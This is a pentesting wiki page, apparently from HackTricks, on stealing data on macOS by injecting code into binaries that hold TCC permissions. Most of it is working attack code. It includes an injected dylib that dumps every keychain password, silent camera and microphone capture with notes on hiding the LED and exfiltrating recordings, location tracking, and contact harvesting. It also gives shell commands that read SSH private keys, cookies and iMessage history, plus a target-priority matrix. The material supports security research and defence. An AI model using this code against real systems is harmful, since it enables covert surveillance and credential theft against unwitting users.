# macOS Credential & Data Theft via TCC Permissions

{{#include ../../../../banners/hacktricks-training.md}}

## Overview

macOS TCC (Transparency, Consent, and Control) protects access to sensitive user data. When an attacker **compromises a binary that already has TCC grants**, they inherit those permissions. This page documents the exploitation potential of each data-theft-related TCC permission.

> [!WARNING]
> Code injection into a TCC-granted binary (via DYLD injection, dylib hijacking, or task port) **silently inherits all its TCC permissions**. There is no additional prompt or verification when the same process reads protected data.

---

## Keychain Access Groups

### The Prize

The macOS Keychain stores:
- **Wi-Fi passwords** — all saved wireless network credentials
- **Website passwords** — Safari, Chrome (when using Keychain), and other browser passwords
- **Application passwords** — email accounts, VPN credentials, development tokens
- **Certificates and private keys** — code signing, client TLS, S/MIME encryption
- **Secure notes** — user-stored secrets

### Entitlement: `keychain-access-groups`

Keychain items are organized into **access groups**. An application's `keychain-access-groups` entitlement lists which groups it can access:

```xml
<key>keychain-access-groups</key>
<array>
    <string>com.apple.cfnetwork</string>   <!-- Network passwords -->
    <string>com.apple.security.personal-information.identity</string>  <!-- Personal certs -->
    <string>apple</string>                  <!-- Broad Apple group -->
    <string>InternetAccounts</string>       <!-- Internet account passwords -->
</array>
```

### Exploitation

```bash
# Find binaries with broad keychain access groups
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE entitlementsString LIKE '%keychain-access-groups%'
  AND isAppleBin = 0
ORDER BY privileged DESC;"

# If you can inject into such a binary, enumerate keychain items:
security dump-keychain -d ~/Library/Keychains/login.keychain-db 2>&1 | head -100

# Find specific passwords
security find-generic-password -s "Wi-Fi" -w 2>&1
security find-internet-password -s "github.com" 2>&1
```

### Code Injection → Keychain Theft

```objc
// Injected dylib code — runs with the target's keychain groups
#import <Security/Security.h>

__attribute__((constructor))
void dumpKeychain(void) {
    NSDictionary *query = @{
        (__bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
        (__bridge id)kSecReturnAttributes: @YES,
        (__bridge id)kSecReturnData: @YES,
        (__bridge id)kSecMatchLimit: (__bridge id)kSecMatchLimitAll
    };
    
    CFArrayRef results = NULL;
    OSStatus status = SecItemCopyMatching((__bridge CFDictionaryRef)query, (CFTypeRef *)&results);
    
    if (status == errSecSuccess) {
        NSArray *items = (__bridge NSArray *)results;
        for (NSDictionary *item in items) {
            NSString *service = item[(__bridge id)kSecAttrService];
            NSString *account = item[(__bridge id)kSecAttrAccount];
            NSData *passData = item[(__bridge id)kSecValueData];
            NSString *password = [[NSString alloc] initWithData:passData encoding:NSUTF8StringEncoding];
            // service, account, password — the full credential triple
        }
    }
}
```

---

## Camera Access (kTCCServiceCamera)

### Exploitation

A binary with camera TCC grant (via `kTCCServiceCamera` or `com.apple.security.device.camera` entitlement) can capture photos and video:

```bash
# Find camera-authorized binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
  "SELECT client FROM access WHERE service='kTCCServiceCamera' AND auth_value=2;"
```

### Silent Capture

```objc
// Injected into a camera-entitled process
#import <AVFoundation/AVFoundation.h>

@interface SilentCapture : NSObject <AVCaptureVideoDataOutputSampleBufferDelegate>
@property (strong) AVCaptureSession *session;
@end

@implementation SilentCapture
- (void)startCapture {
    self.session = [[AVCaptureSession alloc] init];
    AVCaptureDevice *camera = [AVCaptureDevice defaultDeviceWithMediaType:AVMediaTypeVideo];
    AVCaptureDeviceInput *input = [AVCaptureDeviceInput deviceInputWithDevice:camera error:nil];
    [self.session addInput:input];
    
    AVCaptureVideoDataOutput *output = [[AVCaptureVideoDataOutput alloc] init];
    [output setSampleBufferDelegate:self queue:dispatch_get_global_queue(0, 0)];
    [self.session addOutput:output];
    
    [self.session startRunning];
    // Camera LED turns on — but a brief capture may go unnoticed
}

- (void)captureOutput:(AVCaptureOutput *)output
    didOutputSampleBuffer:(CMSampleBufferRef)sampleBuffer
    fromConnection:(AVCaptureConnection *)connection {
    // Each frame can be saved to disk or exfiltrated
    // Stop after capturing a few frames to minimize LED time
    [self.session stopRunning];
}
@end
```

> [!TIP]
> Starting with **macOS Sonoma**, the camera indicator in the menu bar is persistent and cannot be hidden programmatically. On **older macOS versions**, a brief capture may not produce a noticeable indicator.

---

## Microphone Access (kTCCServiceMicrophone)

### Exploitation

Microphone access captures all audio from the built-in mic, headset, or connected audio input devices:

```bash
# Find mic-authorized binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
  "SELECT client FROM access WHERE service='kTCCServiceMicrophone' AND auth_value=2;"
```

### Attack: Ambient Recording

```objc
// Injected into a mic-entitled process
#import <AVFoundation/AVFoundation.h>

- (void)recordAudio {
    NSURL *url = [NSURL fileURLWithPath:@"/tmp/recording.m4a"];
    NSDictionary *settings = @{
        AVFormatIDKey: @(kAudioFormatMPEG4AAC),
        AVSampleRateKey: @44100.0,
        AVNumberOfChannelsKey: @1
    };
    AVAudioRecorder *recorder = [[AVAudioRecorder alloc] initWithURL:url settings:settings error:nil];
    [recorder record];
    // Records everything: conversations, phone calls, ambient audio
    
    // Stop after a duration
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 60 * NSEC_PER_SEC),
                   dispatch_get_main_queue(), ^{
        [recorder stop];
        // Exfiltrate /tmp/recording.m4a
    });
}
```

---

## Location Tracking (kTCCServiceLocation)

### Exploitation

```bash
# Find location-authorized binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
  "SELECT client FROM access WHERE service LIKE '%Location%' AND auth_value=2;"
```

### Continuous Tracking

```objc
#import <CoreLocation/CoreLocation.h>

@interface Tracker : NSObject <CLLocationManagerDelegate>
@end

@implementation Tracker
- (void)startTracking {
    CLLocationManager *mgr = [[CLLocationManager alloc] init];
    mgr.delegate = self;
    mgr.desiredAccuracy = kCLLocationAccuracyBest;
    [mgr startUpdatingLocation];
}

- (void)locationManager:(CLLocationManager *)manager
     didUpdateLocations:(NSArray<CLLocation *> *)locations {
    CLLocation *loc = locations.lastObject;
    // loc.coordinate.latitude, loc.coordinate.longitude
    // Reveals: home address, work address, travel patterns, daily routine
    NSString *entry = [NSString stringWithFormat:@"%f,%f,%@\n",
        loc.coordinate.latitude, loc.coordinate.longitude, [NSDate date]];
    // Append to tracking log
}
@end
```

---

## Contacts / Calendar / Photos

### Personal Data Exfiltration

| TCC Service | Framework | Data |
|---|---|---|
| `kTCCServiceAddressBook` | `Contacts.framework` | Names, emails, phones, addresses |
| `kTCCServiceCalendar` | `EventKit` | Meetings, attendees, locations |
| `kTCCServicePhotos` | `Photos.framework` | Photos, screenshots, location metadata |

```bash
# Find authorized binaries for each service
for svc in kTCCServiceAddressBook kTCCServiceCalendar kTCCServicePhotos; do
  echo "=== $svc ==="
  sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
    "SELECT client FROM access WHERE service='$svc' AND auth_value=2;"
done
```

### Contacts Harvesting

```objc
#import <Contacts/Contacts.h>

CNContactStore *store = [[CNContactStore alloc] init];
NSArray *keys = @[CNContactGivenNameKey, CNContactFamilyNameKey,
                  CNContactEmailAddressesKey, CNContactPhoneNumbersKey];
CNContactFetchRequest *request = [[CNContactFetchRequest alloc] initWithKeysToFetch:keys];

[store enumerateContactsWithFetchRequest:request error:nil
    usingBlock:^(CNContact *contact, BOOL *stop) {
    // contact.givenName, contact.familyName
    // contact.emailAddresses, contact.phoneNumbers
    // All contacts exfiltrated for social engineering / spear phishing
}];
```

---

## iCloud Account Access

### Entitlement: `com.apple.private.icloud-account-access`

This entitlement allows communicating with `com.apple.iCloudHelper` XPC service, providing access to:
- **iCloud tokens** — authentication tokens for the user's Apple ID
- **iCloud Drive** — synced documents from all devices
- **iCloud Keychain** — passwords synced across all Apple devices
- **Find My** — location of all the user's Apple devices

```bash
# Find iCloud-entitled binaries
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE iCloudAccs = 1
ORDER BY privileged DESC;"
```

> [!CAUTION]
> Compromising an iCloud-entitled binary extends the attack from a **single device to the entire Apple ecosystem**: other Macs, iPhones, iPads, Apple Watch. iCloud Keychain sync means passwords from all devices are accessible.

---

## Full Disk Access (kTCCServiceSystemPolicyAllFiles)

### The Most Powerful TCC Permission

Full Disk Access grants read capability to **every file on the system**, including:
- Other apps' data (Messages, Mail, Safari history)
- TCC databases (revealing all other permissions)
- SSH keys and configuration
- Browser cookies and session tokens
- Application databases and caches

```bash
# Find FDA-granted binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
  "SELECT client FROM access WHERE service='kTCCServiceSystemPolicyAllFiles' AND auth_value=2;"

# With FDA, read anything:
cat ~/Library/Messages/chat.db              # iMessage history
cat ~/Library/Safari/History.db             # Safari browsing history
cat ~/Library/Cookies/Cookies.binarycookies # Browser cookies
cat ~/.ssh/id_rsa                           # SSH private key
```

---

## Exploitation Priority Matrix

When assessing injectable TCC-granted binaries, prioritize by data value:

| Priority | TCC Permission | Why |
|---|---|---|
| **Critical** | Full Disk Access | Access to everything |
| **Critical** | TCC Manager | Can grant any permission |
| **High** | Keychain Access Groups | All stored passwords |
| **High** | iCloud Account Access | Multi-device compromise |
| **High** | Input Monitoring (ListenEvent) | Keylogging |
| **High** | Accessibility | GUI control, self-granting |
| **Medium** | Screen Capture | Visual data capture |
| **Medium** | Camera + Microphone | Surveillance |
| **Medium** | Contacts + Calendar | Social engineering data |
| **Low** | Location | Physical tracking |
| **Low** | Photos | Personal data |

## Enumeration Script

```bash
#!/bin/bash
echo "=== TCC Credential Theft Surface Audit ==="

echo -e "\n[*] High-value TCC grants (injectable binaries):"
sqlite3 /tmp/executables.db "
SELECT path, tccPermsStr FROM executables
WHERE (noLibVal = 1 OR allowDyldEnv = 1)
  AND tccPermsStr IS NOT NULL
  AND tccPermsStr != ''
ORDER BY privileged DESC
LIMIT 30;" 2>/dev/null

echo -e "\n[*] Keychain-entitled injectable binaries:"
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE entitlementsString LIKE '%keychain-access-groups%'
  AND (noLibVal = 1 OR allowDyldEnv = 1);" 2>/dev/null

echo -e "\n[*] iCloud-entitled binaries:"
sqlite3 /tmp/executables.db "
SELECT path FROM executables WHERE iCloudAccs = 1;" 2>/dev/null
```

## References

* [Apple Developer — Keychain Services](https://developer.apple.com/documentation/security/keychain_services)
* [Apple Developer — TCC](https://developer.apple.com/documentation/security/protecting-the-user-s-privacy)
* [Objective-See — TCC Exploitation](https://objective-see.org/blog/blog_0x4C.html)
* [OBTS v5.0 — iCloud Token Extraction (Wojciech Regula)](https://www.youtube.com/watch?v=_6e2LhmxVc0)

{{#include ../../../../banners/hacktricks-training.md}}
